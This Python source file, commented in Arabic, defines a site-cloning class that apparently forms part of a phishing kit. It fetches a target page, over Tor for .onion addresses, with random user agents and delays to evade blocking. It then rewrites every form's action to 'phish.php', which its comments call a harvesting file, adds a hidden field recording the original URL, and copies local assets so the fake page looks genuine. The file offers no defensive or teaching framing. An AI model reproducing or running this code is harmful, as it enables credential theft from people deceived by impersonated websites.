#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
نظام استنساخ المواقع - يدعم المواقع العادية ومواقع .onion
"""

import os
import re
import requests
import socks
import socket
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import time
import random

class SiteCloner:
    """
    الفئة المسؤولة عن استنساخ المواقع وتعديل نماذج الإدخال
    """
    
    def __init__(self, use_tor=False, tor_port=9050):
        """
        تهيئة المستنسخ
        
        Args:
            use_tor: هل نستخدم شبكة Tor للمواقع .onion
            tor_port: منفذ Tor (9050 للخدمة العادية)
        """
        self.use_tor = use_tor
        self.tor_port = tor_port
        self.ua = UserAgent()
        self.session = self._create_session()
        
    def _create_session(self):
        """إنشاء جلسة طلبات مع أو بدون Tor"""
        session = requests.Session()
        
        if self.use_tor:
            # إعداد الوكيل لشبكة Tor
            session.proxies = {
                'http': f'socks5h://127.0.0.1:{self.tor_port}',
                'https': f'socks5h://127.0.0.1:{self.tor_port}'
            }
        
        # إضافة Header عشوائي لتجنب الحظر
        session.headers.update({'User-Agent': self.ua.random})
        
        return session
    
    def is_onion_url(self, url):
        """التحقق مما إذا كان الرابط موقع .onion"""
        return '.onion' in url.lower()
    
    def download_page(self, url):
        """
        تحميل صفحة ويب كاملة
        
        Args:
            url: رابط الصفحة المراد تحميلها
            
        Returns:
            محتوى HTML أو None في حالة الفشل
        """
        try:
            print(f"[*] جاري تحميل: {url}")
            
            # تحديد ما إذا كنا بحاجة لاستخدام Tor
            if self.is_onion_url(url) and not self.use_tor:
                print("[!] هذا موقع .onion ويتطلب تفعيل Tor")
                print("[*] جاري إعادة المحاولة مع Tor...")
                self.use_tor = True
                self.session = self._create_session()
            
            # تأخير عشوائي لتجنب الحظر
            time.sleep(random.uniform(1, 3))
            
            response = self.session.get(url, timeout=30)
            response.raise_for_status()
            
            print(f"[✓] تم التحميل بنجاح - الحجم: {len(response.text)} بايت")
            return response.text
            
        except requests.exceptions.RequestException as e:
            print(f"[✗] فشل التحميل: {e}")
            return None
    
    def extract_forms(self, soup):
        """استخراج جميع نماذج الإدخال من الصفحة"""
        forms = soup.find_all('form')
        print(f"[*] تم العثور على {len(forms)} نموذج")
        return forms
    
    def modify_forms(self, soup, base_url):
        """
        تعديل نماذج الإدخال لتوجيه البيانات إلى ملف الحصد
        
        Args:
            soup: كائن BeautifulSoup
            base_url: الرابط الأساسي للموقع
            
        Returns:
            soup المعدل
        """
        forms = self.extract_forms(soup)
        
        for i, form in enumerate(forms):
            print(f"[*] تعديل النموذج {i+1}")
            
            # تغيير action ليشير إلى ملف phish.php
            form['action'] = 'phish.php'
            
            # التأكد أن method هو POST
            form['method'] = 'post'
            
            # إضافة حقل مخفي للرابط الأصلي - الطريقة الصحيحة
            hidden_field = soup.new_tag('input')
            hidden_field['type'] = 'hidden'
            hidden_field['name'] = 'original_url'
            hidden_field['value'] = base_url
            form.append(hidden_field)
        
        return soup
    
    def download_assets(self, soup, base_url, output_dir):
        """
        تحميل الملفات المساعدة (CSS, JS, Images)
        
        Args:
            soup: كائن BeautifulSoup
            base_url: الرابط الأساسي
            output_dir: مجلد الإخراج
        """
        assets_dir = os.path.join(output_dir, 'assets')
        os.makedirs(assets_dir, exist_ok=True)
        
        # قائمة بالملفات المراد تحميلها
        assets = []
        
        # ملفات CSS
        for link in soup.find_all('link', rel='stylesheet'):
            href = link.get('href')
            if href and not href.startswith('http') and not href.startswith('//'):
                assets.append(('css', href, link))
        
        # ملفات JavaScript
        for script in soup.find_all('script', src=True):
            src = script.get('src')
            if src and not src.startswith('http') and not src.startswith('//'):
                assets.append(('js', src, script))
        
        # الصور
        for img in soup.find_all('img', src=True):
            src = img.get('src')
            if src and not src.startswith('http') and not src.startswith('//'):
                assets.append(('img', src, img))
        
        print(f"[*] جاري تحميل {len(assets)} ملف مساعد...")
        
        for asset_type, asset_path, tag in assets:
            try:
                full_url = urljoin(base_url, asset_path)
                filename = os.path.basename(asset_path)
                if not filename:
                    filename = f"asset_{len(assets)}"
                
                # تحميل الملف
                response = self.session.get(full_url, timeout=10)
                
                # حفظ الملف
                local_path = os.path.join(assets_dir, filename)
                with open(local_path, 'wb') as f:
                    f.write(response.content)
                
                # تعديل المسار في HTML
                if asset_type == 'css':
                    tag['href'] = f'assets/{filename}'
                elif asset_type == 'js':
                    tag['src'] = f'assets/{filename}'
                elif asset_type == 'img':
                    tag['src'] = f'assets/{filename}'
                    
            except Exception as e:
                print(f"[!] فشل تحميل {asset_path}: {e}")
        
        return soup
    
    def clone_site(self, url, output_dir):
        """
        استنساخ موقع كامل
        
        Args:
            url: رابط الموقع المراد استنساخه
            output_dir: مجلد الإخراج
        
        Returns:
            bool: نجاح أو فشل العملية
        """
        try:
            # إنشاء مجلد الإخراج
            os.makedirs(output_dir, exist_ok=True)
            
            # تحميل الصفحة
            html_content = self.download_page(url)
            if not html_content:
                return False
            
            # تحليل HTML
            soup = BeautifulSoup(html_content, 'html.parser')
            
            # تعديل النماذج
            soup = self.modify_forms(soup, url)
            
            # تحميل الملفات المساعدة
            soup = self.download_assets(soup, url, output_dir)
            
            # حفظ ملف HTML المعدل
            index_path = os.path.join(output_dir, 'index.html')
            with open(index_path, 'w', encoding='utf-8') as f:
                f.write(str(soup))
            
            print(f"[✓] تم استنساخ الموقع بنجاح في: {output_dir}")
            return True
            
        except Exception as e:
            print(f"[✗] فشل الاستنساخ: {e}")
            return False
